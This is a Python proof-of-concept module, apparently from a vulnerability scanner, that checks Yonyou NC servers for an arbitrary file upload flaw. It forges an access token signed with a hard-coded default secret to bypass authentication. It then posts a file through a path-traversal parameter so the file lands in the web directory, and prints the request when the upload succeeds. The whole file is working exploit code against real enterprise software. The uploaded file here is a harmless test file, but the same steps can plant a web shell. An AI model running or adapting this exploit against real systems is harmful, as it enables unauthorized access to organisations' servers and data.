'''
Function:
    yonyounc uploadChunk 文件上传漏洞
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import json
import base64
import hashlib
import hmac
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers_upload = {
            'User-Agent': get_user_agent.get_user_agent(),
        }
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
        }
        self.proxies = proxies
        self.result_text = ""

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return scheme, netloc

    def base64_decode(self, secret_key):
        strbase64 = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        dictbase64 = {k: i for i, k in enumerate(strbase64)}
        dictbase64[b"="[0]] = 0
        strarr = (secret_key[i - 4:i] for i in range(4, len(secret_key) + 1, 4))
        arrby = bytearray()
        num = 0
        for nuits in strarr:
            rint = 0
            for k in nuits:
                if k == b"="[0]: num += 1  # 统计尾部等号个数
                rint = (rint << 6) + dictbase64[k]
            arrby.extend(rint.to_bytes(3, "big"))
        while num:  # 去除尾部0字符
            arrby.pop()
            num -= 1
        return bytes(arrby)

    def create_jwt(self):
        secret_key = self.base64_decode(b"defaultSecret")
        headers = {
          "alg": "HS256",
          "typ": "JWT"
        }
        payload = {"userid": "1"}
        first = base64.urlsafe_b64encode(json.dumps(headers, separators=(',', ':')).encode('utf-8').replace(b'=', b'')).decode('utf-8').replace('=', '')
        second = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode('utf-8').replace(b'=', b'')).decode('utf-8').replace('=', '')
        first_second = f"{first}.{second}"
        third = base64.urlsafe_b64encode(hmac.new(secret_key, first_second.encode('utf-8'), hashlib.sha256).digest()).decode('utf-8').replace('=', '')
        token = ".".join([first, second, third])
        return token

    def vuln(self, netloc, scheme):
        url = "{}://{}/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1".format(scheme, netloc)
        data = {
        'file': ('test.txt', '1111', None),
        }
        self.headers_upload["accessTokenNcc"] = "{}".format(self.create_jwt())
        try:
            result = requests.post(url=url, files=data, headers=self.headers_upload, verify=False, timeout=3, proxies=self.proxies)
            # req = requests.get("{}://{}/nccloud/test.txt".format(scheme, netloc), headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if "nologin" not in result.text and "操作成功" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n"
                bodys = result.request.body.decode().split("\r\n")
                for body in bodys:
                    self.result_text += "\n                 {}".format(body)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.vuln(netloc=netloc, scheme=scheme):
            return self.result_text
        else:
            return False

